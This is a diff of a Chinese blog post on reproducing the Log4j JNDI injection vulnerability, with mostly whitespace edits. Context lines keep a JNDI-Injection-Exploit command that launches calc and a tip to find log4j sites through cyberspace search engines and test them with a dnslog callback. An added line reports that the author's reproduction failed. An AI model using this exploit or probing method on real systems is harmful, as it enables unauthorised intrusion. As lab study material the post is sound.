@@ -15,15 +15,15 @@ draft: false
 
 **可以利用网络空间查询哪些站用了log4j，把利用代码的IP地址改为dnslog地址，如果有回显就说明漏洞存在。**
 
-Apache 的一个开源项目，通过使用 Log4j ，我们可以控制日志信息输送的目的地是控制台、文件、 GUI 组件，甚至是套接口服务器、 NT 的事件记录器、 UNIX Syslog 守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。
+Apache 的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、 GUI 组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。
 
 #### Log4j组件安全复现
 
-1. Maven 引用 Log4j
+1. Maven引用Log4j
 2. 接受用户输入值
-3. Log4j 处理错误输入
+3. Log4j处理错误输入
 
-4. 利用 jndi-ldap 执行
+4. 利用jndi-ldap执行
 
 Test:
 
@@ -143,6 +143,8 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "IP地址"
 ```
 
 可参考：https://blog.csdn.net/weixin_43895765/article/details/121943404
+
+但是我这里不知道是什么问题执行没成功，估计是JDK版本问题，我电脑本身的JDK8不知道为什么问题很多，后续会换，目前还是看文章内的吧。
 
 ![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3603.png)
 
